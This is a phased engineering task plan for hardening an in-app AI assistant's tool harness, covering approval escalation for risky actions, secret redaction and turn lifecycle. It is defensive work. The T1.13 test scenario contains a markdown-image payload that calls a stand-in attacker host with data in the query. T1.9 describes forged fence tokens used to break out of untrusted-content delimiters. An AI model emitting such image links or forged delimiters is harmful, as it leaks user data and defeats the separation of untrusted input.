# Tasks: relay-harness-hardening

Source: `SPEC.md` and `PLAN.md` in this folder (final). Format per `~/.claude/docs/task-conventions.md`. Requirement IDs (`HH-*`) and ride-along Lows (`L-*`) refer to SPEC section 7; every one of the 39 requirements is covered by at least one implementation task and one regression test in a `Unit:` or `E2E:` task.

Conventions for this file:
- Package manager is bun. The dev server is `https://requestly.localhost/app` and is always running; never start it. Run targeted specs only, never the full e2e suite.
- E2E base: `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app`. The project has the seeded QA harness (`e2e/fixtures/qa.ts`, `e2e/qa/`), so browser Verify steps are `bunx playwright test e2e/qa/relay-harness-hardening/<spec>`; `agent-browser` is used only for the optional proof screenshots (headless, seeded with `--init-script e2e/fixtures/qa-seed.init.js`, `AGENT_BROWSER_SESSION=requestly`, end with `agent-browser close`). New specs live in `e2e/qa/relay-harness-hardening/` (one file per user flow).
- Implementation tasks keep EXISTING specs green (update assertions their change breaks) but do not author new coverage. Every requirement's regression test is written by the dedicated `Unit:` / `E2E:` task of its phase, and that task must confirm each new test fails against the pre-fix behaviour (write the test red first; use `git stash` of the source change or the pre-fix assertion) before it is accepted.
- Line numbers in `REPORT.md` and `PLAN.md` drift. Re-check them (grep) before editing any file. Every cited path was resolved against the repo at HEAD `d88bbc3`; files marked "(new)" do not exist yet and are created by that task.
- Locale rule: every new UI string or error code needs en, fr and ja keys in `messages/{en,fr,ja}/relayDock.json` with ICU placeholders intact. To keep tasks at <=5 files, each phase has one `Locale:` task at the end of its implementation tasks; implementation tasks use the named error codes and `describe` text, and the locale task wires the strings.
- Skip mode behaviour is unchanged unless a requirement says otherwise; every escalation, lifecycle and gate test asserts Skip explicitly.
- One `bunx tsc --noEmit` only, in the final gate (T6.1), never per phase. Per-phase checkpoints use targeted vitest, `bunx biome check` on touched files, and targeted headless e2e.
- No tests under `src/components/reactbits/`. Do not commit unless told.
- Phase 0 is not needed: Playwright/Vitest exist, `playwright.config.ts` already supports `E2E_SERVER=dev|prod` (`E2E_PROD_PORT`, `reuseExistingServer: false` for prod; `next.config.ts` honours `E2E_DIST_DIR`), and `.gitignore` already covers `test-results`, `playwright-report`, `coverage/`, `.dashboard/*/reports/`, `.next-e2e`.
- Sequencing: tasks that touch `schemas.ts`, `changeLog.ts`, `useRelayChat.ts` or `guard.ts` are sequential (declared with `Depends on`). Phase 5 is fully sequential.

---

## Phase 1: Security and exfiltration (HH-RISK, H02, H03, H04, M04, M05, M06, M07)

**Adds:** In Review mode, risky Relay actions (script writes, turning on shared variable values, TLS off, global base URL and header changes, downloads) now ask for approval first, markdown images in replies show as click-only links, secrets are masked in more formats, and deleting a request with an unsaved tab always asks.
**Try in UI:** In Review mode ask Relay to set a pre-request script and confirm an approval card shows the full script ; Switch to Skip mode and confirm the same call runs with no card ; Have Relay reply with a markdown image and confirm a link, not a loaded image ; Delete a request whose tab has unsaved edits in Skip mode and confirm the save/discard prompt appears.

### T1.1 ☐ HH-RISK: `risk()` table and Review-only escalation
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/registry.ts`
- **Do:** Next to `approvalNeeded` in `schemas.ts` add `risk(name, input, ctx): "low" | "escalate"` (`ctx` = read-only current settings, needed only by the T1.6 header diff) backed by a table beside `RELAY_TOOL_SCHEMAS` (one decision site; no second one). `approvalNeeded` returns true for an `auto` tool with `escalate` only when `mode === "review"`; Skip and Always-ask are untouched. Route `awaitsUser`, `runValidated`, `describe` and `previewConfirmation` through it so the card appears and the run is gated consistently; escalating `auto` tools get a `describe` (fall back to `describeGeneric`). The table starts empty of entries; later tasks add rows. A pending card's decision stays bound to its own call when the mode flips.
- **Acceptance:**
  - An `auto` call whose `risk` is `escalate` is held for a card in Review mode exactly like a `confirm` call (HH-RISK).
  - The same call runs without a card in Skip mode, and Always-ask behaviour is byte-for-byte unchanged (HH-RISK).
  - `awaitsUser` and `runValidated` agree for every escalating tool; a mode flip while a card is pending still records the decision per call (HH-RISK).
  - Several escalating calls in one turn show one card each and none runs before its approval; a tool that is already `confirm` is never double-prompted (Phase 1 edge cases).
  - Existing registry and schema specs stay green.
- **Verify:** `bunx vitest run src/lib/relay/tools`; `bunx biome check src/lib/relay/tools/schemas.ts src/lib/relay/tools/registry.ts`

### T1.2 ☐ HH-H02: markdown images never render
- **Kind:** implementation
- **Files:** `src/components/relay/RelayMarkdown.tsx`
- **Do:** Override `img` so no `<img>` element is ever produced. Render the alt text (or the URL when alt is empty) as a plain link with `rel="noopener noreferrer"` and `target="_blank"`, only when `allowRelayUrl` accepts the URL; otherwise render the alt text as plain text with no link. Image syntax inside code blocks stays literal code. Optional hardening (not required): CSP `img-src 'self' data:`.
- **Acceptance:**
  - https/http image markdown yields one link and zero `img` elements (HH-H02).
  - `data:`, `javascript:` and relative image URLs yield plain text and no link; empty alt shows the URL as link text for allowed URLs (HH-H02).
  - Links produced from images use the same allow-list as normal links; code-block image syntax is untouched.
- **Verify:** `bunx vitest run src/components/relay`; `bunx biome check src/components/relay/RelayMarkdown.tsx`

### T1.3 ☐ HH-H03: script writes escalate and refuse secret literals
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/requestWrite.ts`, `src/lib/relay/redact.ts`, `src/components/relay/ConfirmCard.tsx` (render `ConfirmPreview.detail` and the `confirm.risk.*` titles), `src/components/relay/ConfirmCard.spec.tsx`
- **Do:** Add the `set_request_scripts` row to the `risk()` table (always `escalate`, even for an unchanged script: no diffing shortcut) and a `describe` that shows the full script text. Add a helper in `redact.ts` that detects token-shaped literals using the existing redaction patterns and make `set_request_scripts` refuse them with a coded error (`script_contains_secret`). Reword the tool description so it no longer claims scripts are never run (A2; L-01 only as far as the description).
- **Acceptance:**
  - Review mode: a card with the full script appears and nothing is written until approved (HH-H03).
  - Skip mode writes with no card (HH-H03).
  - A script containing a token-shaped literal is refused with `script_contains_secret` in every mode (HH-H03).
  - The description text no longer says scripts are not run (HH-H03).
- **Verify:** `bunx vitest run src/lib/relay/tools src/lib/relay/redact`; `bunx biome check src/lib/relay/tools/schemas.ts src/lib/relay/tools/requestWrite.ts src/lib/relay/redact.ts`
- **Depends on:** T1.1

### T1.4 ☐ HH-H04 and L-07: `shareValues -> true` escalates; one environment shape
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/settingsWrite.ts` (`set_relay_preferences`), `src/lib/relay/tools/schemas.ts`, `src/lib/relay/redact.ts`, `src/lib/relay/tools/workspaceRead.ts`
- **Do:** Add a `risk()` row for `set_relay_preferences` that is input-dependent: `shareValues: true` escalates, `shareValues: false` and `enabled: false` stay low. Skip applies it (A1; this supersedes relay-spec promise 6 for Skip). Make `redactEnvironment` and `describeEnvironment` derive from one function returning one shape (L-07). `shareValues` toggled twice in one turn must produce one card per escalating call.
- **Acceptance:**
  - Review: a card for `shareValues: true`, none for `false` (HH-H04).
  - Denying leaves the preference false and the next `get_environment` still masks values (HH-H04).
  - Skip applies `true` with no card; `enabled: false` behaviour unchanged (HH-H04).
  - `redactEnvironment` and `describeEnvironment` return deep-equal shapes for one environment (L-07).
- **Verify:** `bunx vitest run src/lib/relay/tools src/lib/relay/redact`; `bunx biome check src/lib/relay/tools/settingsWrite.ts src/lib/relay/tools/schemas.ts src/lib/relay/redact.ts src/lib/relay/tools/workspaceRead.ts`
- **Depends on:** T1.3

### T1.5 ☐ HH-M04: redaction gaps and basic-auth usernames
- **Kind:** implementation
- **Files:** `src/lib/relay/redact.ts`, `src/lib/relay/redact.corpus.ts`, `src/lib/relay/curl.ts`
- **Do:** Add patterns for `Authorization: Token ...`, lowercase `basic`, `sk_test_`/`sk_live_`, `glpat-`, and `?key=` / `access_key` to `redactValue` and `redactDeep` (scripts included). In `curl.ts` treat a token-shaped basic-auth username (`curl -u sk_test_...:`) as a secret: import stores it as a variable/secret, `buildCurl` never echoes it. Add each new format to `redact.corpus.ts`.
- **Acceptance:**
  - Every listed format is masked by both `redactValue` and `redactDeep` and is present in `redact.corpus.ts` (HH-M04).
  - `import_curl` then `export_curl` of `curl -u sk_test_...:` shows the username masked (HH-M04).
- **Verify:** `bunx vitest run src/lib/relay/redact src/lib/relay/curl`; `bunx biome check src/lib/relay/redact.ts src/lib/relay/redact.corpus.ts src/lib/relay/curl.ts`
- **Depends on:** T1.4

### T1.6 ☐ HH-M05: `resolveSendTarget()` and base URL/global header escalation
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/network.ts`, `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/settingsWrite.ts` (`set_global_variables`: `baseUrl` and `headers`)
- **Do:** Add one `resolveSendTarget()` in `network.ts` used by both the send card (`describe`) and `send_request`; resolve relative URLs against the base URL before the scheme check, and fail with coded `no_base_url` when none is set. Validate `baseUrl` with `urlProblem`. Add `risk()` rows for `set_global_variables`: a `baseUrl` change and any add or value change of a global (default) header escalate in Review; removing a header stays auto (`headers` is a full replacement list, so this row diffs the input against the current `globalHeaders` read from `risk()`'s read-only `ctx`). `urlProblem` lives in `requestWrite.ts`; import it, do not copy it.
- **Acceptance:**
  - Card host equals the real destination host (HH-M05).
  - A relative URL sends when a base URL is set and fails with `no_base_url` when not (HH-M05).
  - An invalid base URL is rejected (HH-M05).
  - Review escalates base URL and global header add/value change; Skip runs them; header removal is auto in both (HH-M05).
- **Verify:** `bunx vitest run src/lib/relay/tools`; `bunx biome check src/lib/relay/tools/network.ts src/lib/relay/tools/schemas.ts src/lib/relay/tools/settingsWrite.ts`
- **Depends on:** T1.4

### T1.7 ☐ HH-M06 and L-05: TLS off and downloads escalate; drop `proxyUrl`
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/settingsWrite.ts`, `src/lib/relay/tools/history.ts` (`export_history`), `src/lib/relay/tools/catalogTools.ts` (`export_postman`)
- **Do:** Add `risk()` rows: `sslVerify -> false` escalates (true stays auto); `export_history` (`history.ts`, via `exportHistory` -> `downloadFile`) and `export_postman` (`catalogTools.ts`, `downloadPostmanCollection`) escalate in Review; these are the only `auto` tools that trigger a file download at HEAD (`export_backup` in `backupTools.ts` is already `confirm`: no risk row, no double prompt; `export_curl` returns text, not a download). Remove `proxyUrl` from the `update_proxy_settings` schema (A15). Leave `ProxySection.tsx`, `useSettingsStore.proxyUrl` and `changeLog.ts` `PROXY_KEYS` untouched so old entries still undo.
- **Acceptance:**
  - Review card for `sslVerify: false`, none for `true` (HH-M06).
  - The tool JSON schema has no `proxyUrl` and a call passing it fails zod (HH-M06).
  - `export_history` and `export_postman` show a card in Review and none in Skip (L-05).
  - A change-log entry recorded before the fix, with `proxyUrl` in its snapshot, still restores `proxyUrl` (HH-M06).
  - The Settings proxy field (`ProxySection.tsx`, `useSettingsStore.proxyUrl`) is unaffected (HH-M06).
  - `export_backup` shows exactly one card in Review, not two (Phase 1 edge case).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/tools/schemas.ts src/lib/relay/tools/settingsWrite.ts src/lib/relay/tools/history.ts src/lib/relay/tools/catalogTools.ts`
- **Depends on:** T1.6

### T1.8 ☐ HH-M07: dirty-tab gate on delete tools in every mode
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/tabs.ts`, `src/lib/relay/tools/schemas.ts`, `src/stores/useTabsStore.ts`
- **Do:** Register the existing dirty-tab confirm gate (`registerConfirmGate`) on the delete tools so it shows in every mode (RP-221, A16). Do not create a second gate; H07 (Phase 3) reuses it. Declining leaves request and tab untouched.
- **Acceptance:**
  - In Skip mode, deleting a request with a dirty tab shows the gate and succeeds after confirm (HH-M07).
  - Declining leaves the request and its tab unchanged (HH-M07).
- **Verify:** `bunx vitest run src/lib/relay/tools src/stores`; `bunx biome check src/lib/relay/tools/tabs.ts src/lib/relay/tools/schemas.ts src/stores/useTabsStore.ts`
- **Depends on:** T1.7

### T1.9 ☐ L-04 and L-24: shared response fence with delimiter stripping
- **Kind:** implementation
- **Files:** `src/lib/relay/fence.ts` (new shared helper), `src/lib/relay/tools/workspaceRead.ts` (move the private `stripDelimiters` and the `UNTRUSTED_BODY_OPEN/CLOSE` fence out of here into `fence.ts`), `src/lib/relay/attachments.ts`, `src/lib/relay/tools/smart.ts` (`diff_responses`), `src/lib/relay/tools/tabRequests.ts` (`describeMessages`, WebSocket output)
- **Do:** Move `stripDelimiters` and the response fence from `workspaceRead.ts` into `fence.ts` (one copy; `workspaceRead.ts` imports it). Wrap `diff_responses` output and WebSocket message output in the shared response fence with both delimiter tokens stripped. Strip both tokens from every resolved attachment-detail section by reusing `stripDelimiters`. Keep the helper in a shared file because HH-M15 (T4.5) edits `tabRequests.ts` near the WebSocket output.
- **Acceptance:**
  - A forged fence token inside a diff or a WebSocket message is stripped (L-04).
  - An attachment name containing the close token cannot terminate the fence (L-24).
  - Existing `workspaceRead` response-fence specs stay green (single `stripDelimiters` copy).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/fence.ts src/lib/relay/tools/workspaceRead.ts src/lib/relay/attachments.ts src/lib/relay/tools/smart.ts src/lib/relay/tools/tabRequests.ts`
- **Depends on:** T1.4

### T1.10 ☐ Locale: Phase 1 strings
- **Kind:** implementation
- **Files:** `messages/en/relayDock.json`, `messages/fr/relayDock.json`, `messages/ja/relayDock.json`, `src/components/relay/ConfirmCard.tsx` (consume `confirm.risk.*`), `src/components/relay/confirmRisk.ts` (new), `src/components/relay/MessageParts.tsx` (pass `risk` prop)
- **Do:** Add en/fr/ja keys for the Phase 1 error codes and card labels: `script_contains_secret`, `no_base_url`, the escalation card titles/summary text for script write, share values, TLS off, base URL, global header and downloads, and the dirty-tab delete gate wording if new. Preserve ICU placeholders; keep key sets identical across the three files.
- **Acceptance:**
  - Each new code/label exists in en, fr and ja with identical placeholders (HH-H03, HH-M05, HH-M06, HH-M07).
  - The existing locale parity spec stays green.
- **Verify:** `bunx vitest run src/i18n src/lib/relay`; `bunx biome check messages/en/relayDock.json messages/fr/relayDock.json messages/ja/relayDock.json`
- **Depends on:** T1.9

### T1.11 ☐ Unit: risk layer, scripts, preferences, redaction
- **Kind:** unit
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/registry.ts`, `src/lib/relay/redact.ts`, `src/lib/relay/curl.ts`, `src/lib/relay/tools/tabs.ts`, `src/lib/relay/tools/schemas.risk.spec.ts`, `src/lib/relay/tools/registry.risk.spec.ts`
- **Do:** Write failing-first regression specs (`schemas.risk.spec.ts`, `registry.risk.spec.ts`, `redact.spec.ts` / corpus run, `curl.spec.ts`, `tabs.spec.ts`): the risk x mode matrix (escalating and non-escalating input in Review, Skip, Always-ask; mode flip with a pending card; several escalating calls in one turn get one card each; a `confirm` tool is not double-prompted); `awaitsUser` vs `runValidated` agreement for each escalating tool; `set_request_scripts` Review/Skip, secret refusal and description text; `shareValues` true/false/enabled:false and deny-then-masked `get_environment`; every HH-M04 format plus the `import_curl -> export_curl` username round trip; L-07 deep-equal shapes; HH-M07 Skip-mode dirty-tab gate and decline.
- **Acceptance:** Covers HH-RISK, HH-H03, HH-H04, HH-M04, HH-M07, L-07. Every new test fails on pre-fix code. Every file >=80% lines/branches/functions/statements, target >95%; no `it.fails` unless the source has a real bug.
- **Verify:** `bunx vitest run src/lib/relay/tools/schemas.risk.spec.ts src/lib/relay/tools/registry.risk.spec.ts src/lib/relay/redact.spec.ts src/lib/relay/curl.spec.ts src/lib/relay/tools/tabs.spec.ts --coverage --coverage.include=src/lib/relay/tools/schemas.ts,src/lib/relay/tools/registry.ts,src/lib/relay/redact.ts,src/lib/relay/curl.ts,src/lib/relay/tools/tabs.ts --coverage.reporter=text`
- **Depends on:** T1.10

### T1.12 ☐ Unit: images, send target, TLS/downloads, fences
- **Kind:** unit
- **Files:** `src/components/relay/RelayMarkdown.tsx`, `src/lib/relay/tools/network.ts`, `src/lib/relay/tools/settingsWrite.ts`, `src/lib/relay/attachments.ts`, `src/lib/relay/fence.ts`, `src/lib/relay/fence.spec.ts`
- **Do:** Write failing-first specs: `RelayMarkdown.spec.tsx` (https, http, `data:`, relative, empty alt, image in code block: zero `img` elements, link/plain-text outcomes per HH-H02); `network.spec.ts` (`resolveSendTarget` card host equals destination, relative URL with and without base URL, invalid base URL, base URL and global header escalation, header removal auto); `settingsWrite.spec.ts` (`sslVerify` true/false, `proxyUrl` rejected by zod, old `PROXY_KEYS` snapshot undo); download escalation in Review vs Skip (L-05); `fence.spec.ts`, `attachments.spec.ts`, plus fence cases in the existing `smart.spec.ts` (`diff_responses`) and `tabRequests.spec.ts` (WebSocket messages) (forged fence/close token stripped, L-04, L-24).
- **Acceptance:** Covers HH-H02, HH-M05, HH-M06, L-04, L-05, L-24. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/components/relay/RelayMarkdown.spec.tsx src/lib/relay/tools/network.spec.ts src/lib/relay/tools/settingsWrite.spec.ts src/lib/relay/attachments.spec.ts src/lib/relay/fence.spec.ts src/lib/relay/tools/smart.spec.ts src/lib/relay/tools/tabRequests.spec.ts --coverage --coverage.include=src/components/relay/RelayMarkdown.tsx,src/lib/relay/tools/network.ts,src/lib/relay/tools/settingsWrite.ts,src/lib/relay/attachments.ts,src/lib/relay/fence.ts --coverage.reporter=text`
- **Depends on:** T1.11

### T1.13 ☐ E2E: security approvals and image rendering
- **Kind:** e2e
- **Scenarios:**
  - `@critical` Review mode: scripted `set_request_scripts` shows a card with the full script, no write before Approve; Skip mode writes with no card (HH-H03, HH-RISK)
  - `@critical` a reply containing `![](https://attacker.test/x?d=1)` renders a link, zero `img`, and no network request to the image host (HH-H02)
  - `@critical` Review: `shareValues: true` shows a card; Deny leaves values masked on the next `get_environment` (HH-H04)
  - `@high` Review card for base URL change and for `sslVerify: false`; none in Skip (HH-M05, HH-M06)
  - `@high` Skip mode: deleting a request with a dirty tab shows the gate; confirm deletes, decline leaves request and tab intact (HH-M07)
  - `@medium` Review: `export_history` shows a card, Skip does not (L-05)
- **Spec:** `e2e/qa/relay-harness-hardening/security.spec.ts`
- **Acceptance:** Every scenario passes 3 of 3 repeats; the image scenario asserts no request to the image URL via `page.route`/request listener; each Review scenario has a Skip counterpart assertion.
- **Files:** `agent_docs/qa/security/*.png` (proof shots), none expected (stub-model helpers in `e2e/fixtures/relayE2eHelpers.ts` are reused; add a seed file only if the existing seeds lack a request with an open tab).
- **Verify:** `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/security.spec.ts --repeat-each=3`
- **Depends on:** T1.12

🔶 **Checkpoint 1**: Review-only escalation works through one decision site, images never load, secrets are masked in the new formats, the dirty-tab delete gate shows in Skip; targeted vitest, `biome check` on touched files and `security.spec.ts` green.

---

## Phase 2: Turn lifecycle (HH-TURN, H01, H05, H06, M01, M20, M21, M22, M23, M24)

**Adds:** Stop truly ends a turn, Retry no longer duplicates work, a thread switch keeps tool results and changes in the original thread, Send is blocked while tools run, partial replies survive reloads and thread switches, Regenerate asks whether to keep or undo the turn's changes, and Relay settings sync across browser tabs.
**Try in UI:** Start a multi-step run and press Stop; confirm no further steps run ; Make a step fail after 3 successful creates and press Retry; confirm no duplicate requests ; Switch threads while a tool is running and confirm the change appears in the original thread's Changes bar ; Press Regenerate on a turn with applied changes and confirm the Keep/Undo dialog.

### T2.1 ☐ HH-TURN: turn store and per-call binding
- **Kind:** implementation
- **Files:** `src/stores/useRelayTurnStore.ts` (new), `src/hooks/useRelayChat.ts`, `src/hooks/useToolQueue.ts` (new), `src/hooks/relayTurnHelpers.ts` (new)
- **Do:** Highest-risk task: land alone with behaviour identical to today. Zustand store with the state machine `idle -> streaming -> awaiting-user -> running-tools -> stopped | capped | errored`, legal transitions only (illegal ones are rejected, not thrown away silently: log with context). Extract the tool queue and turn helpers out of the 884-line `useRelayChat.ts` so functions stay under ~30 lines. At `onToolCall` create a binding `{threadId, turnId, attachments, addToolOutput, controller}` and use it instead of the refs read at run time (`addToolOutputRef`). Existing relay specs must stay green with no assertion changes beyond renamed imports.
- **Acceptance:**
  - Each legal transition is implemented and each illegal one is rejected (HH-TURN).
  - Every queued tool is bound at call time to thread, turn, attachments, `addToolOutput` and an `AbortController` (HH-TURN).
  - All existing relay hook and e2e specs stay green; `useRelayChat.ts` shrinks and no behaviour changes.
- **Verify:** `bunx vitest run src/hooks src/stores src/components/relay`; `bunx biome check src/stores/useRelayTurnStore.ts src/hooks/useRelayChat.ts src/hooks/useToolQueue.ts src/hooks/relayTurnHelpers.ts`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay/relay-chat.spec.ts e2e/qa/relay/relay-confirm.spec.ts`

### T2.2 ☐ HH-H01: Stop ends the turn
- **Kind:** implementation
- **Files:** `src/hooks/useRelayChat.ts`, `src/stores/useRelayTurnStore.ts`, `src/hooks/useToolQueue.ts`, `src/hooks/useRelayChat.spec.ts` (existing; holds the Stop specs that mock the follow-up turn)
- **Do:** Stop sets `stopped`, cleared only by a new send or Retry/Regenerate. `sendAutomaticallyWhen` returns false while stopped. Late outputs from stopped tools are still recorded (ChangeCard kept) but trigger no new request. Replace the existing spec that mocked the follow-up turn with the corrected expectation. Stop with zero tools, Stop during an approval card, Stop then immediately Send, and Retry after `stopped`/`capped` must all work.
- **Acceptance:**
  - After Stop during an approved `run_chain`, zero new requests are made (HH-H01).
  - A late tool result after Stop is recorded but does not trigger a request (HH-H01).
  - Stop with no running tools and Stop at an approval card do not crash (HH-H01).
- **Verify:** `bunx vitest run src/hooks src/stores`; `bunx biome check src/hooks/useRelayChat.ts src/stores/useRelayTurnStore.ts src/hooks/useToolQueue.ts`
- **Depends on:** T2.1

### T2.3 ☐ HH-H06: thread switch mid-run
- **Kind:** implementation
- **Files:** `src/hooks/useToolQueue.ts`, `src/lib/relay/changeLog.ts`, `src/lib/relay/threadDb.ts`, `src/stores/useRelayStore.ts`
- **Do:** Tools write, attribute changes and deliver outputs to the thread and turn captured at call time; the change log records the captured turn id (also the foundation for HH-M23). Do not block thread switching. A thread deleted while one of its tools is queued: the change is still logged under the captured turn and stays undoable from the change log; the output is dropped without a crash. Also covers two tools queued, switch, first finishes after the switch.
- **Acceptance:**
  - Switch threads while a tool is queued: the change appears in the original thread's Changes bar and the output lands in the original thread (HH-H06).
  - "Undo all" in the new thread does not revert it (HH-H06).
  - Deleted-thread case: change logged and undoable, output dropped, no crash (HH-H06).
- **Verify:** `bunx vitest run src/hooks src/lib/relay src/stores`; `bunx biome check src/hooks/useToolQueue.ts src/lib/relay/changeLog.ts src/lib/relay/threadDb.ts src/stores/useRelayStore.ts`
- **Depends on:** T2.2

### T2.4 ☐ HH-M01 and HH-M20: abortable auto tools; Send blocked while pending
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/registry.ts`, `src/lib/relay/tools/network.ts`, `src/hooks/useToolQueue.ts`, `src/components/relay/RelayComposer.tsx`
- **Do:** Pass each call's `AbortController.signal` into `ToolContext.signal`; `send_request` and other long auto tools honour it, and an aborted tool records an honest "aborted" change-log state (no half-applied write reported as success). Running auto tools count toward `approvedRunning`. `RelayComposer` shows Stop while any tool is pending/running and disables Send; no path may call `sendMessage` with a pending tool.
- **Acceptance:**
  - In Skip mode, Stop during `send_request` aborts the fetch and the composer shows Stop throughout (HH-M01).
  - Send is disabled while tools are queued; no code path calls `sendMessage` with a pending tool (HH-M20).
  - A late result and its ChangeCard are never lost (HH-M20).
- **Verify:** `bunx vitest run src/hooks src/components/relay src/lib/relay/tools`; `bunx biome check src/lib/relay/tools/registry.ts src/lib/relay/tools/network.ts src/hooks/useToolQueue.ts src/components/relay/RelayComposer.tsx`
- **Depends on:** T2.3

### T2.5 ☐ HH-H05 and L-23: Retry versus Regenerate, `step_cap` Continue
- **Kind:** implementation
- **Files:** `src/hooks/useRelayChat.ts`, `src/components/relay/MessageActions.tsx`, `src/components/relay/ErrorBubble.tsx`, `src/lib/relay/errors.ts`
- **Do:** Split the two actions. Retry resends from the last completed tool step without dropping finished tool parts; Retry before any tool step behaves as a plain resend. Regenerate with applied changes goes through the HH-M23 dialog (T2.6). A step-cap rejection returns a distinct `step_cap` code and the error bubble offers "Continue" instead of Retry (L-23). Retry after a `capped` or `stopped` turn works.
- **Acceptance:**
  - Three `create_request` calls succeed, step 4 errors, Retry produces no extra requests: the store holds exactly 3 new requests (HH-H05).
  - A `step_cap` rejection shows a Continue action, not Retry (L-23).
  - Retry with no prior tool step behaves as a plain resend (HH-H05).
- **Verify:** `bunx vitest run src/hooks src/components/relay src/lib/relay`; `bunx biome check src/hooks/useRelayChat.ts src/components/relay/MessageActions.tsx src/components/relay/ErrorBubble.tsx src/lib/relay/errors.ts`
- **Depends on:** T2.4

### T2.6 ☐ HH-M23 and L-21: Keep/Undo dialog before discarding a turn
- **Kind:** implementation
- **Files:** `src/components/relay/KeepUndoDialog.tsx` (new), `src/components/relay/TurnChangeBar.tsx`, `src/components/relay/UserMessageActions.tsx`, `src/components/relay/MessageActions.tsx`, `src/lib/relay/changeGroups.ts`
- **Do:** Before Regenerate or Edit & resend cuts a turn that has applied changes, show the changes with "Undo them" or "Keep them". Keep re-keys the changes to the new turn id (uses the captured turn id from T2.3). The Changes bar counts `changeIds`, not only `changeId`, and R4 grouping uses the same count (L-21). No orphan changes without an Undo entry point.
- **Acceptance:**
  - Regenerate path: the Changes bar count equals what "Undo all" reverts (HH-M23).
  - Edit & resend path leaves no orphan changes without an Undo entry point; Keep re-keys to the new turn (HH-M23).
  - The count uses `changeIds` in both the bar and R4 grouping (L-21).
- **Verify:** `bunx vitest run src/components/relay src/lib/relay`; `bunx biome check src/components/relay/KeepUndoDialog.tsx src/components/relay/TurnChangeBar.tsx src/components/relay/UserMessageActions.tsx src/components/relay/MessageActions.tsx src/lib/relay/changeGroups.ts`
- **Depends on:** T2.5

### T2.7 ☐ HH-M21, L-26, L-16: partial save, pagehide, version compare
- **Kind:** implementation
- **Files:** `src/lib/relay/threadDb.ts`, `src/stores/useRelayStore.ts`, `src/lib/relay/constants.ts`
- **Do:** Add `RELAY_PARTIAL_SAVE_MS = 2000`. Throttled partial save while streaming, flush on thread switch and `pagehide`; a restored partial reply is marked Interrupted. A failed save keeps its pending entry until a write succeeds and surfaces a "not saved" state after 3 failures (L-26). Compare `updatedAt`/version before a write so two tabs on one thread do not overwrite each other (L-16). Persisted-field changes beyond those named in the spec are ask-first.
- **Acceptance:**
  - Simulated `pagehide` mid-stream and thread switch mid-stream both reload with the partial reply marked Interrupted (HH-M21).
  - A failed save keeps its pending entry; after 3 failures a "not saved" state is exposed (L-26).
  - A stale `updatedAt` write is detected and does not overwrite the newer thread (L-16).
- **Verify:** `bunx vitest run src/lib/relay src/stores`; `bunx biome check src/lib/relay/threadDb.ts src/stores/useRelayStore.ts src/lib/relay/constants.ts`
- **Depends on:** T2.6

### T2.8 ☐ HH-M22, L-03, L-18: running marker, interrupted settle, cancel = Declined
- **Kind:** implementation
- **Files:** `src/lib/relay/threadDb.ts`, `src/stores/useRelayStore.ts`, `src/components/relay/ToolRow.tsx`, `src/components/relay/MessageParts.tsx`, `src/hooks/useToolQueue.ts`
- **Do:** Persist a "running" marker when an approved call starts (a new persisted field named by the spec; permitted). Restore settles it as "interrupted, may have applied" with a link to the change log, never "Declined automatically". Auto tools without results settle as interrupted instead of spinning forever and the model is told the outcome is unknown (L-03). Treat both cancel errors as declined so declining `import_backup` shows Declined, not Failed (L-18). Restore must stay read-tolerant of legacy threads without the marker. Persist the marker in the approval click handler, before the tool starts, so a page closed between the click and the tool start also restores as interrupted (Phase 2 edge case).
- **Acceptance:**
  - Reload during an approved confirm-kind call settles it as "interrupted, may have applied" with a change-log link (HH-M22).
  - An auto tool with no result settles as interrupted and the model is told the outcome is unknown (L-03).
  - Declining `import_backup` renders Declined (L-18).
  - A legacy persisted thread without the marker still restores.
- **Verify:** `bunx vitest run src/lib/relay src/stores src/components/relay src/hooks`; `bunx biome check src/lib/relay/threadDb.ts src/stores/useRelayStore.ts src/components/relay/ToolRow.tsx src/components/relay/MessageParts.tsx src/hooks/useToolQueue.ts`
- **Depends on:** T2.7

### T2.9 ☐ HH-M24 and L-10: cross-tab sync and pending turn-off persisted
- **Kind:** implementation
- **Files:** `src/stores/useRelayPermissionStore.ts`, `src/stores/useRelayStore.ts`, `src/hooks/useToolQueue.ts`
- **Do:** Add a `storage` event listener that rehydrates permission mode and `enabled` so a tightened mode in tab A applies in tab B before B's next tool call (A17). Persist the pending "turn Relay off after this reply" with the thread (L-10).
- **Acceptance:**
  - Tightening the mode or disabling Relay in tab A is reflected in tab B before B's next tool call (simulated `storage` event) (HH-M24).
  - The pending "turn Relay off after this reply" survives reload (L-10).
- **Verify:** `bunx vitest run src/stores src/hooks`; `bunx biome check src/stores/useRelayPermissionStore.ts src/stores/useRelayStore.ts src/hooks/useToolQueue.ts`
- **Depends on:** T2.8

### T2.10 ☐ Locale: Phase 2 strings
- **Kind:** implementation
- **Files:** `messages/en/relayDock.json`, `messages/fr/relayDock.json`, `messages/ja/relayDock.json`
- **Do:** Add en/fr/ja keys for: `step_cap` error and "Continue" action, the Keep/Undo dialog (title, "Undo them", "Keep them"), "Interrupted" and "interrupted, may have applied" with the change-log link text, "not saved" state, Retry vs Regenerate labels, and Declined for cancelled `import_backup`. Preserve ICU placeholders.
- **Acceptance:**
  - Every new Phase 2 string exists in en, fr and ja with identical placeholders (HH-H05, HH-M21, HH-M22, HH-M23, L-23, L-26).
  - The locale parity spec stays green.
- **Verify:** `bunx vitest run src/i18n src/components/relay`; `bunx biome check messages/en/relayDock.json messages/fr/relayDock.json messages/ja/relayDock.json`
